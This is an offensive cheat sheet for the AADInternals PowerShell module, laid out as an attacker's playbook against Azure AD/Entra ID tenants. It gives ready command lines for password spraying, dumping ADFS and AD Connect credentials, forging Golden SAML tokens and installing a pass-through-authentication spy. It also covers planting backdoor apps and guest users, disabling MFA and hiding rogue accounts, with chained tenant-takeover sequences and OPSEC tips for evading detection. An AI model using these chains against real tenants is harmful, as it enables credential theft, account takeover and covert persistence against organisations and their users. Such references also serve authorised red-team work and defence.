# AADInternals

**Type:** PowerShell Module
**Purpose:** Azure AD/Entra ID administration, exploitation, and post-exploitation
**Platform:** Windows, PowerShell Core (Linux/macOS)
**Tags:** #azure #azuread #entraid #powershell #enumeration #credentials #persistence #post-exploitation #token-manipulation

---

## Installation & Setup

```powershell
# Install from PowerShell Gallery
Install-Module AADInternals

# Import module
Import-Module AADInternals

# Update to latest version
Update-Module AADInternals
```

---

## Quick Reference (Most Common Commands)

```powershell
# Get access token
Get-AADIntAccessTokenForAADGraph

# Enumerate tenant info
Get-AADIntTenantDetails -Domain company.com

# Dump users
Get-AADIntUsers

# Get user's cloud info
Get-AADIntUserDetails -UserPrincipalName user@domain.com

# Create backdoor admin
New-AADIntGuestUser -EmailAddress attacker@evil.com
```

---

## RECON: Tenant Discovery

### RECON: Get Tenant Information
**Use Case:** Discover tenant details from domain name

```powershell
# Get tenant details
Get-AADIntTenantDetails -Domain company.com

# Get tenant ID
Get-AADIntTenantID -Domain company.com

# Get tenant domains
Get-AADIntTenantDomains -Domain company.com
```

### RECON: Check Login Information
**Use Case:** Enumerate authentication details for a domain

```powershell
# Get login information for domain
Get-AADIntLoginInformation -Domain company.com

# Check if user exists
Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com
```

### RECON: Enumerate Open ID Configuration
**Use Case:** Discover tenant federation settings

```powershell
# Get OpenID configuration
Get-AADIntOpenIDConfiguration -Domain company.com

# Get tenant brand information
Get-AADIntTenantBranding -Domain company.com
```

---

## ENUM: User & Group Enumeration

### ENUM: List All Users
**Use Case:** Dump all Azure AD users from authenticated session

```powershell
# Get all users
Get-AADIntUsers

# Get specific user details
Get-AADIntUser -UserPrincipalName user@company.com

# Get user's group memberships
Get-AADIntUserGroups -UserPrincipalName user@company.com
```

### ENUM: List Groups
**Use Case:** Enumerate Azure AD groups

```powershell
# Get all groups
Get-AADIntGroups

# Get group members
Get-AADIntGroupMembers -GroupId <group-object-id>
```

### ENUM: List Service Principals
**Use Case:** Enumerate applications and service principals

```powershell
# Get all service principals
Get-AADIntServicePrincipals

# Get specific service principal
Get-AADIntServicePrincipal -ObjectId <object-id>
```

### ENUM: List Devices
**Use Case:** Enumerate registered/joined devices

```powershell
# Get all devices
Get-AADIntDevices

# Get specific device
Get-AADIntDevice -DeviceId <device-id>
```

---

## CRED: Authentication & Token Operations

### CRED: Get Access Tokens
**Use Case:** Obtain access tokens for various Azure services

```powershell
# AAD Graph token
Get-AADIntAccessTokenForAADGraph

# MS Graph token
Get-AADIntAccessTokenForMSGraph

# Azure Core Management
Get-AADIntAccessTokenForAzureCoreManagement

# Exchange Online
Get-AADIntAccessTokenForEXO

# Teams
Get-AADIntAccessTokenForTeams

# SharePoint Online
Get-AADIntAccessTokenForSPO -Domain company.sharepoint.com

# OneDrive
Get-AADIntAccessTokenForOneDrive
```

### CRED: Certificate-Based Authentication
**Use Case:** Authenticate using certificates

```powershell
# Get token using certificate
Get-AADIntAccessTokenForAADGraph -Certificate $cert -ClientId <client-id> -Tenant <tenant-id>

# Export existing certificate from Azure AD
Export-AADIntADFSSigningCertificate
```

### CRED: Managed Identity Token Theft
**Use Case:** Steal tokens from Azure VM managed identities

```powershell
# Get token from managed identity
Get-AADIntAccessTokenForAADGraph -Managed

# Get token with user-assigned identity
Get-AADIntAccessTokenForAADGraph -Managed -ClientId <client-id>
```

---

## CRED: Password Attacks

### CRED: Password Spray
**Use Case:** Password spray attack against Azure AD

```powershell
# Invoke password spray
Invoke-AADIntPasswordSprayAttack -UserName users.txt -Password "Summer2024!"

# Single user password spray
Invoke-AADIntPasswordSprayAttack -UserName user@company.com -Password "Password123"
```

### CRED: Dump Passwords from ADFS
**Use Case:** Extract credentials from compromised ADFS server

```powershell
# Export ADFS configuration (includes encrypted passwords)
Export-AADIntADFSConfiguration

# Get ADFS DKM key
Get-AADIntADFSConfigurationKeyContainer

# Decrypt ADFS passwords
Get-AADIntADFSServiceAccount
```

---

## PERSIST: Persistence Mechanisms

### PERSIST: Create Backdoor Application
**Use Case:** Register malicious application for persistence

```powershell
# Create new application
New-AADIntApplication -DisplayName "Legitimate App"

# Add credentials to application
Add-AADIntApplicationCredentials -ObjectId <app-object-id>

# Grant admin consent
Grant-AADIntAdminConsent -ObjectId <app-object-id>
```

### PERSIST: Golden SAML Attack
**Use Case:** Generate SAML tokens for any user (requires ADFS compromise)

```powershell
# Export ADFS signing certificate
Export-AADIntADFSSigningCertificate

# Create SAML token
New-AADIntSAMLToken -ImmutableID <user-immutable-id> -Issuer <issuer-uri> -Certificate $cert
```

### PERSIST: Create Guest User
**Use Case:** Add external attacker as guest user

```powershell
# Invite guest user
New-AADIntGuestUser -EmailAddress attacker@evil.com

# Add guest to group
Add-AADIntGroupMember -GroupId <group-id> -MemberId <guest-user-id>
```

### PERSIST: Modify Federation Settings
**Use Case:** Backdoor domain federation (requires Global Admin)

```powershell
# Convert domain to federated
ConvertTo-AADIntFederated -Domain company.com

# Get federation settings
Get-AADIntFederationSettings -Domain company.com
```

---

## PRIVESC: Privilege Escalation

### PRIVESC: Add User to Admin Role
**Use Case:** Elevate user privileges

```powershell
# Add user to Global Admin role
Add-AADIntRoleMember -RoleName "Company Administrator" -MemberId <user-object-id>

# List available roles
Get-AADIntRoles

# Get role members
Get-AADIntRoleMembers -RoleName "Company Administrator"
```

### PRIVESC: Reset User Password
**Use Case:** Reset password of privileged user

```powershell
# Reset password (requires Password Admin or higher)
Set-AADIntUserPassword -UserPrincipalName target@company.com -Password "NewPassword123!"

# Force password change on next login
Set-AADIntUserPassword -UserPrincipalName target@company.com -Password "NewPassword123!" -ForceChangePasswordNextSignIn $true
```

---

## EXEC: Azure AD Modification

### EXEC: Create New User
**Use Case:** Create rogue user account

```powershell
# Create new user
New-AADIntUser -DisplayName "Service Account" -UserPrincipalName svc@company.com -Password "P@ssw0rd!"

# Create user with specific attributes
New-AADIntUser -DisplayName "John Doe" -UserPrincipalName john@company.com -Password "P@ss!" -JobTitle "IT Admin"
```

### EXEC: Modify User Properties
**Use Case:** Update user attributes

```powershell
# Set user properties
Set-AADIntUser -UserPrincipalName user@company.com -JobTitle "Global Admin" -Department "IT"

# Enable/disable user
Set-AADIntUser -UserPrincipalName user@company.com -AccountEnabled $true
```

---

## EXEC: Azure AD Connect Exploitation

### EXEC: Export AD Connect Credentials
**Use Case:** Extract credentials from Azure AD Connect server

```powershell
# Get AD Connect credentials (run on AD Connect server)
Get-AADIntSyncCredentials

# Export configuration
Export-AADIntADSyncConfiguration
```

### EXEC: Hybrid Identity Attacks
**Use Case:** Pass-through auth and password hash sync attacks

```powershell
# Install PTA agent backdoor
Install-AADIntPTASpy

# Get PTA credentials
Get-AADIntPTASpyLog

# Set cloud password (requires MSOL_ account from AD Connect)
Set-AADIntUserPassword -CloudAnchor "user_1234..." -Password "NewP@ss!"
```

---

## LATERAL: Microsoft 365 Service Access

### LATERAL: Exchange Online
**Use Case:** Access Exchange mailboxes

```powershell
# Get EXO access token
$token = Get-AADIntAccessTokenForEXO

# Read emails (requires additional Graph/EWS calls)
```

### LATERAL: SharePoint/OneDrive
**Use Case:** Access SharePoint sites and OneDrive

```powershell
# Get SPO token
$token = Get-AADIntAccessTokenForSPO -Domain company.sharepoint.com

# List user's OneDrive files
Get-AADIntOneDriveFiles -AccessToken $token
```

### LATERAL: Teams Access
**Use Case:** Access Teams data

```powershell
# Get Teams token
$token = Get-AADIntAccessTokenForTeams

# Access Teams messages (requires Graph API calls)
```

---

## DEFENSE-EVASION: Stealth Operations

### DEFENSE-EVASION: Disable MFA for User
**Use Case:** Remove MFA requirement (highly suspicious)

```powershell
# Disable MFA (requires StrongAuthentication admin)
Set-AADIntUser -UserPrincipalName user@company.com -StrongAuthenticationRequirements @()
```

### DEFENSE-EVASION: Hide User from GAL
**Use Case:** Hide rogue account from Global Address List

```powershell
# Hide user from GAL
Set-AADIntUser -UserPrincipalName backdoor@company.com -ShowInAddressList $false
```

---

## Attack Patterns

### Pattern: External Recon → Password Spray → Token Theft
```powershell
# 1. Recon tenant
Get-AADIntTenantDetails -Domain company.com
Get-AADIntLoginInformation -Domain company.com

# 2. Enumerate users (if possible)
Invoke-AADIntUserEnumerationAsOutsider -UserName users.txt

# 3. Password spray
Invoke-AADIntPasswordSprayAttack -UserName valid-users.txt -Password "SeasonYear!"

# 4. Get tokens after successful auth
Get-AADIntAccessTokenForAADGraph
Get-AADIntAccessTokenForMSGraph
```

### Pattern: Compromised User → Privilege Escalation
```powershell
# 1. Get initial access token
Get-AADIntAccessTokenForAADGraph

# 2. Enumerate environment
Get-AADIntUsers
Get-AADIntGroups
Get-AADIntServicePrincipals

# 3. Check current permissions
Get-AADIntRoleMembers -RoleName "Company Administrator"

# 4. Escalate if possible
Add-AADIntRoleMember -RoleName "Company Administrator" -MemberId <your-user-id>
```

### Pattern: AD Connect Server Compromise → Full Tenant Takeover
```powershell
# 1. Extract AD Connect credentials (on AD Connect server)
Get-AADIntSyncCredentials

# 2. Use MSOL account to reset any cloud password
Set-AADIntUserPassword -CloudAnchor "<target-cloud-anchor>" -Password "Pwned123!"

# 3. Login as Global Admin
Get-AADIntAccessTokenForAADGraph

# 4. Maintain persistence
New-AADIntApplication -DisplayName "Monitoring Service"
Add-AADIntApplicationCredentials -ObjectId <app-id>
Grant-AADIntAdminConsent -ObjectId <app-id>
```

---

## Pro Tips

💡 **Token Caching**: AADInternals caches tokens. Use `-UseRefreshToken` to get fresh tokens
💡 **Certificate Auth**: More stealthy than password auth, especially for service principals
💡 **AD Connect**: The MSOL_ account can reset ANY cloud user password - highest value target
💡 **Golden SAML**: Works even if passwords are changed, requires ADFS signing cert
💡 **Managed Identities**: On Azure VMs, you can get tokens without any credentials
💡 **Federation Backdoor**: Setting up federated domain is extremely powerful but very noisy
💡 **Guest Users**: Often overlooked in detection, can grant access to external attackers
💡 **PTA Spy**: Can harvest credentials for ALL authenticating users on hybrid tenants

---

## Key Functions by Category

**Reconnaissance:**
- `Get-AADIntTenantDetails`, `Get-AADIntLoginInformation`, `Invoke-AADIntUserEnumerationAsOutsider`

**Enumeration:**
- `Get-AADIntUsers`, `Get-AADIntGroups`, `Get-AADIntServicePrincipals`, `Get-AADIntDevices`

**Tokens:**
- `Get-AADIntAccessTokenFor*` (AADGraph, MSGraph, EXO, Teams, SPO, etc.)

**Credential Attacks:**
- `Invoke-AADIntPasswordSprayAttack`, `Get-AADIntADFSServiceAccount`

**Persistence:**
- `New-AADIntApplication`, `New-AADIntGuestUser`, `ConvertTo-AADIntFederated`, `New-AADIntSAMLToken`

**Privilege Escalation:**
- `Add-AADIntRoleMember`, `Set-AADIntUserPassword`, `Get-AADIntSyncCredentials`

**Hybrid Identity:**
- `Get-AADIntSyncCredentials`, `Install-AADIntPTASpy`, `Export-AADIntADFSConfiguration`

---

## OPSEC Considerations

⚠️ **High Risk:**
- ConvertTo-AADIntFederated (extremely noisy)
- Add-AADIntRoleMember to Global Admin
- Install-AADIntPTASpy (requires admin on PTA server)

⚠️ **Medium Risk:**
- New-AADIntApplication with admin consent
- Set-AADIntUserPassword (generates password reset logs)
- Invoke-AADIntPasswordSprayAttack (account lockouts)

✅ **Lower Risk:**
- Get-AADInt* enumeration commands
- Token operations using valid credentials
- Certificate-based authentication

---

## Resources

- Documentation: https://aadinternals.com/aadinternals
- GitHub: https://github.com/Gerenios/AADInternals
- O365 Blog: https://o365blog.com/aadinternals
